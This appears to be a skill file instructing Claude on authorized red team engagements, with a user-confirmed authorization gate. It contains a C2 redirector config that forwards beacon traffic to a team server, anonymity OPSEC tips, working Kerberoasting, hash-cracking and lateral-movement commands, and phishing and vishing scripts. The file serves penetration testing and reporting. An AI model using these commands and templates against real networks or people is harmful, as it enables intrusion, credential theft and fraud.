---
name: Red Team Operations & Engagement Planning
description: Authorized red team engagement planning, C2 architecture design, attack methodology, lateral movement strategy, OPSEC, and professional reporting
version: 2.0.0
author: Masriyan
tags: [cybersecurity, red-team, c2, lateral-movement, persistence, pentest, engagement, opsec]
---

# Red Team Operations & Engagement Planning

## Purpose

Enable Claude to assist authorized red team operators with engagement planning, C2 infrastructure design, attack methodology guidance, lateral movement strategy, OPSEC planning, and comprehensive reporting. Every workflow requires confirmed written authorization.

> **CRITICAL — AUTHORIZATION GATE**: Red team assistance requires explicit authorization confirmation before proceeding. Claude will ask for authorization context and will not assist with active attack planning without it.
>
> **Authorized contexts:**
> - Signed Statement of Work (SOW) or Rules of Engagement (ROE)
> - Bug bounty program (confirm target is in-scope)
> - Internal security testing (confirm organizational authority)
> - CTF competition (confirm challenge platform and scope)
> - Research in owned/isolated lab environment

---

## Activation Triggers

This skill activates when the user asks about:
- Planning a red team engagement or adversary simulation
- Designing C2 infrastructure (redirectors, team servers, C2 profiles)
- Active Directory attack paths (BloodHound, Kerberoasting, DCSync)
- Lateral movement techniques for authorized engagements
- Persistence mechanisms in red team context
- Social engineering campaign planning (authorized)
- Red team reporting and executive presentations
- Tabletop exercises (TTX) design
- Purple team collaboration
- OPSEC planning for authorized operations

---

## Prerequisites

```bash
pip install pyyaml requests
```

**Tools for authorized operations:**
- `Cobalt Strike / Sliver / Havoc` — C2 frameworks
- `Metasploit` — Exploitation framework
- `BloodHound / SharpHound` — AD attack path analysis
- `Impacket` — Network protocol tools
- `CrackMapExec / NetExec` — AD enumeration
- `Responder` — LLMNR/NBT-NS poisoning
- `Mimikatz` — Credential access (Windows)

---

## Authorization Verification

**Before any operational planning, Claude asks:**

```
Red team assistance requires authorization confirmation:

1. What is the engagement type?
   □ External penetration test
   □ Internal network assessment
   □ Red team / adversary simulation
   □ Social engineering assessment
   □ Physical security assessment
   □ CTF competition

2. What is your authorization basis?
   □ Signed SOW / contract with target organization
   □ Internal role (IT/Security team testing own systems)
   □ Bug bounty — [program name]
   □ CTF — [platform and challenge name]

3. What is the defined scope?
   (IP ranges, domains, systems, excluded assets)

4. Who is the target organization's security point of contact?
   (For deconfliction — required for IR-level engagements)

Confirm before proceeding. Operational assistance without confirmed
authorization cannot be provided.
```

---

## Core Capabilities

### 1. Engagement Planning

**When the user asks to plan a red team engagement:**

**Engagement Planning Framework:**

```markdown
# Red Team Engagement Plan
**Client:** [Organization Name]
**Engagement Type:** [Full Red Team / CRTO / APT Simulation]
**Start Date:** [Date]
**End Date:** [Date]
**Rules of Engagement Version:** 1.0

## Objectives
- Primary: [e.g., Test detection and response capabilities against APT29 TTPs]
- Secondary: [e.g., Identify privilege escalation paths to Domain Admin]
- Out of Scope: [e.g., Production databases, payment systems, physical access]

## Threat Profile
**Simulating:** [APT29 / FIN7 / LockBit / Custom adversary profile]
**Initial Access Vector:** [Spearphishing / Supply chain / Watering hole]
**Primary Goal:** [Data exfiltration / Ransomware simulation / Domain takeover]

## Attack Kill Chain Phases
1. Reconnaissance → OSINT, subdomain enum (Skill 01)
2. Initial Access → Phishing / external vuln exploitation
3. Execution → PowerShell / LOLBins / custom implant
4. Persistence → Registry / service / scheduled task
5. Privilege Escalation → Local privesc → Domain Admin
6. Defense Evasion → Process injection / AMSI bypass
7. Credential Access → LSASS / Kerberoasting / DCSync
8. Lateral Movement → PSExec / WMI / RDP
9. Collection → Identify critical data
10. Exfiltration → Staged transfer to simulated C2

## Rules of Engagement
- Testing hours: [24x7 / Business hours only / Agreed windows]
- Destructive testing: [Prohibited / Limited / Authorized]
- DoS testing: [Prohibited]
- Social engineering: [Authorized / Prohibited / Phishing only]
- Physical access: [Prohibited / Badge cloning only]
- Deconfliction: Call [POC Name] at [Phone] if critical systems impacted

## Emergency Abort Procedure
If critical systems are impacted unexpectedly:
1. Immediately cease all operations
2. Call [POC] at [Phone] — available 24/7
3. Document what was done and when
4. Stand down until authorized to resume
```

**Engagement Planning Script:**
```bash
python scripts/engagement_planner.py --scope scope.json --output plan.md
```

### 2. C2 Infrastructure Design

**When the user asks about C2 infrastructure for authorized operations:**

**Multi-Tier C2 Architecture:**

```
[Team Server] ← (internal/VPN only) → [Redirector 1 (HTTPS)] ← → [Beacon]
                                    → [Redirector 2 (DNS)]   ← → [Beacon]
                                    → [Backup Redirector]
```

**Infrastructure Components:**

1. **Team Server** — Never directly exposed to internet; VPN access only
2. **Redirectors** — Cloud VPS instances (AWS/Azure/GCP) that proxy C2 traffic
3. **C2 Channels** — HTTPS (primary), DNS (backup), WebSocket (evasive)
4. **Domain Selection** — Aged domains, categorized (business/tech), valid cert

**Redirector Setup (Apache mod_rewrite):**
```apache
# Redirect only Cobalt Strike beacon traffic to team server
# Everything else → sends to legitimate domain (blend in)
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 6.1; WOW64\) AppleWebKit.*"
RewriteCond %{REQUEST_URI} "^/jquery-3\.3\.1\.min\.js$"
RewriteRule ^(.*)$ http://TEAMSERVER_IP/$1 [P,L]
RewriteRule ^(.*)$ https://microsoft.com/ [R=302,L]  # Decoy redirect
```

**Malleable C2 Profile Considerations:**
- Mimic legitimate application traffic (CDN requests, Office updates, etc.)
- Match real User-Agent strings from target environment
- Use appropriate HTTP headers (Host, Accept-Language, etc.)
- Set sleep/jitter to blend with normal traffic intervals

**OPSEC Checklist:**
```
Infrastructure OPSEC:
[ ] Team server not directly accessible from internet
[ ] All redirectors provisioned from different providers than each other
[ ] Domain registered with privacy protection
[ ] Domain aged ≥30 days before operation
[ ] TLS certificate from legitimate CA (not self-signed)
[ ] Kill dates set on all implants
[ ] Logging enabled on team server for post-engagement review

Operational OPSEC:
[ ] VPN/Tor for infrastructure access (not home IP)
[ ] Separate browser profile for research vs. operation
[ ] No real name/email in domain registration
[ ] Payment via anonymous method where legally permitted
[ ] Implant config: sandbox detection, sleep with jitter
[ ] All C2 traffic encrypted and indistinguishable from HTTPS
```

### 3. Active Directory Attack Methodology

**When the user asks about AD attack paths for authorized engagements:**

**BloodHound Analysis Workflow:**
```bash
# Collection (run on domain-joined host in scope)
# PowerShell-based (noisier but complete)
Import-Module SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# C# executable (quieter)
SharpHound.exe -c All --outputdirectory C:\temp\

# Upload ZIP to BloodHound UI and analyze:
# Queries to run:
# - Find Shortest Paths to Domain Admins
# - Find Principals with DCSync Rights
# - Find Computers with Unsupported Operating Systems
# - Find AS-REP Roastable Users
```

**Key AD Attack Techniques (authorized):**

| Technique | ATT&CK ID | Tool | Description |
|-----------|-----------|------|-------------|
| Kerberoasting | T1558.003 | Rubeus, Impacket | Request TGS for SPNs → crack offline |
| AS-REP Roasting | T1558.004 | Rubeus, GetNPUsers.py | Users with no pre-auth required |
| Pass-the-Hash | T1550.002 | Impacket, CrackMapExec | Use NTLM hash without cracking |
| Pass-the-Ticket | T1550.003 | Rubeus | Use Kerberos ticket for auth |
| Overpass-the-Hash | T1550.003 | Rubeus | Convert NTLM hash to TGT |
| DCSync | T1003.006 | Mimikatz, Impacket | Replicate domain hashes |
| Golden Ticket | T1558.001 | Mimikatz | Forge TGT with KRBTGT hash |
| Silver Ticket | T1558.002 | Mimikatz | Forge TGS for specific service |

**Kerberoasting (authorized use):**
```bash
# Using Impacket (Linux → Windows domain)
GetUserSPNs.py -dc-ip 192.168.1.10 domain.local/user:password -request

# Using Rubeus (on Windows, in scope)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Lateral Movement Options:**
```bash
# PsExec style (via Impacket)
psexec.py domain.local/admin:password@192.168.1.20

# WMI execution
wmiexec.py domain.local/admin:password@192.168.1.20

# SMB with NetExec
nxc smb 192.168.1.0/24 -u admin -p 'password' --shares

# RDP (if authorized)
rdesktop -u admin -p password 192.168.1.20
```

### 4. Social Engineering (Authorized Campaigns)

**When the user asks to plan an authorized social engineering exercise:**

**Phishing Campaign Framework:**

1. **Scope confirmation** — What targets are authorized? What is prohibited?
2. **Pretext development** — What scenario is believable for this organization?
   - IT help desk password reset
   - Finance: invoice / payment confirmation
   - HR: benefits enrollment
   - Executive: board communication
3. **Infrastructure setup** — Phishing domain, email server, landing page
4. **Landing page** — Credential harvester or payload delivery
5. **Tracking** — Click tracking, credential capture, payload execution
6. **Reporting metrics** — Click rate, credential submission rate, report rate

**Pretext Template (for authorized campaigns):**
```
Subject: Action Required: IT Security Policy Update — Password Reset Required

From: IT Help Desk <helpdesk@[spoofed-or-lookalike-domain]>

Dear [Name],

As part of our ongoing security improvements, all employees must update their
passwords by [date]. Please click the link below to verify your identity and
reset your password:

[Phishing Link]

If you did not receive this email or have questions, contact the IT Help Desk
at x4444.

Regards,
IT Security Team
[Company Name]

---
[Include realistic footer with physical address, unsubscribe link for legitimacy]
```

**Vishing Script Template:**
```
Caller: "Hi, this is [Name] from IT Security. We've detected some unusual 
activity on your account. I need to verify your identity. Can I get your
employee ID and the last four digits of your SSN?..."
```

### 5. Red Team Reporting

**When the user asks to create a red team report:**

```markdown
# Red Team Assessment Report
**CLIENT CONFIDENTIAL**

**Organization:** [Client Name]
**Assessment Type:** [Red Team / APT Simulation]
**Assessment Period:** [Date] to [Date]
**Report Date:** [Date]
**Report Classification:** Client Confidential

---

## Executive Summary
[2-3 paragraphs: what was tested, what was found at high level, 
key recommendations. Written for non-technical executives.]

**Overall Risk Rating:** [Critical / High / Medium / Low]

**Key Findings:**
1. Initial access achieved via [vector] within [timeframe]
2. Domain Admin achieved via [technique] after [timeframe]
3. Detection gap: [N] hours from initial access to detection
4. [N] objectives achieved out of [N] defined

---

## Attack Timeline
| Phase | Time | Action | Detection? |
|-------|------|--------|-----------|
| Recon | T+0h | OSINT gathering | No |
| Initial Access | T+4h | Phishing email clicked | No |
| C2 Established | T+4h | Beacon callback | No |
| Privilege Escalation | T+8h | Local admin via CVE-2024-XXXX | No |
| Domain Admin | T+12h | Kerberoasting → hash cracked | No |
| Simulated Exfiltration | T+16h | 10GB to simulated drop server | Yes (T+20h) |

---

## Findings by Category

### CRITICAL: [Finding Title]
**MITRE ATT&CK:** T1078 — Valid Accounts
**Detection:** Not detected by SOC
**Impact:** Full domain compromise achieved
**Evidence:** [Screenshot/log showing access]
**Recommendation:** Implement MFA for all privileged accounts

---

## Detection Analysis
- MTTD (Mean Time to Detect): 20 hours
- Detections triggered: 2 of 15 attack phases
- Detection gaps: [list what was NOT detected]

## Recommendations (Prioritized)
| # | Recommendation | Priority | Effort |
|---|---------------|----------|--------|
| 1 | MFA for all privileged accounts | Critical | Low |
| 2 | EDR policy: block PsExec from non-admin hosts | High | Medium |
| 3 | Enable PowerShell Script Block Logging | High | Low |
```

---

## Script Reference

### `engagement_planner.py`
```bash
python scripts/engagement_planner.py --scope scope.json --output plan.md
```

---

## Skill Integration

| Condition | Adjacent Skill |
|-----------|---------------|
| Initial recon phase | → Skill 01 (Recon & OSINT) |
| Exploit confirmed vulnerabilities | ← Skill 03 (Exploit Development) |
| Provide findings for defensive improvements | → Skill 15 (Blue Team Defense) |
| Test SOC detection capabilities | → Skill 11 (CSOC Automation) |

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Sliver C2 Documentation](https://github.com/BishopFox/sliver)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Red Team Field Manual (RTFM)](https://leanpub.com/rtfm-red-team-field-manual)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [Cobalt Strike Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
